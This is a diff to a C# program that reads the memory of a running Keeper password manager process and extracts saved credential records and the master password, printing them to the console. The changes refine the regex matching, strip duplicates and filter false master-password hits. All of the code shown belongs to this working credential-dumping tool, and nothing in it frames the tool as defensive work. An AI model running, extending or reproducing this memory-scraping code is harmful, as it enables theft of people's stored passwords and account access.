@@ -33,12 +33,24 @@ static class Program
             try
             {
                 int endIndex = Math.Min(index + eindex, text.Length);
-                Regex reg = new Regex("(\\{[ -~]+[custom\\\"[ -~]\\}|notes\\\"[ -~]\\}])");
+                Regex reg = new Regex("(\\{\\\"title\\\"[ -~]+\\}(?=\\s))");
                 string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
-                if ((match.Length > 2) && (!stringsList.Contains(match)))
+
+                int match_cut = match.IndexOf("}  ");
+                //Console.WriteLine(match_cut);
+                if (match_cut != -1 )
+                {
+                    match = match.Substring(0, match_cut + "}  ".Length).TrimEnd();
+                    if (!stringsList.Contains(match) && match.Length > 20)
+                    {
+                        Console.WriteLine("->Credential Record Found : " + match.Substring(0, match_cut + "}  ".Length) + "\n");
+                        stringsList.Add(match);
+                    }
+
+                } else if (!stringsList.Contains(match.TrimEnd()) && match.Length > 20)
                 {
                     Console.WriteLine("->Credential Record Found : " + match + "\n");
-                    stringsList.Add(match);
+                    stringsList.Add(match.TrimEnd());
                 }
                 index = text.IndexOf("{\"title\":\"", index + 1);
                 eindex = text.IndexOf("}", eindex + 1);
@@ -88,10 +100,15 @@ static class Program
             {
                 int endIndex = Math.Min(index + eindex, text.Length);
                 Regex reg = new Regex("(data_key[ -~]+)");
-                var match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
-                if (match.Replace("data_key", "").Length > 5)
+                var match_one = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
+                Regex clean = new Regex("(_[a-zA-z]{1,14}_[a-zA-Z]{1,10})");
+                if (match_one.Replace("data_key", "").Length > 5)
                 {
-                    Console.WriteLine("->Master Password : " + match.Replace("data_key", "") + "\n");
+                    if (!clean.IsMatch(match_one.Replace("data_key", "")))
+                    {
+                        Console.WriteLine("->Master Password : " + match_one.Replace("data_key", "") + "\n");
+                    }
+
                 }
                 index = text.IndexOf("data_key", index + 1);
                 eindex = index + 64;
@@ -114,7 +131,7 @@ static class Program
             {
                 Console.WriteLine("->Keeper Target PID Found: {0}", process.Id.ToString());
                 Console.WriteLine("->Searching...\n");
-                IntPtr processHandle = OpenProcess(0x00000400|0x00000010, false, process.Id);
+                IntPtr processHandle = OpenProcess(0x00000400 | 0x00000010, false, process.Id);
                 IntPtr address = new IntPtr(0x10000000000);
                 MEMORY_BASIC_INFORMATION memInfo = new MEMORY_BASIC_INFORMATION();
                 while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf(memInfo)) != 0)
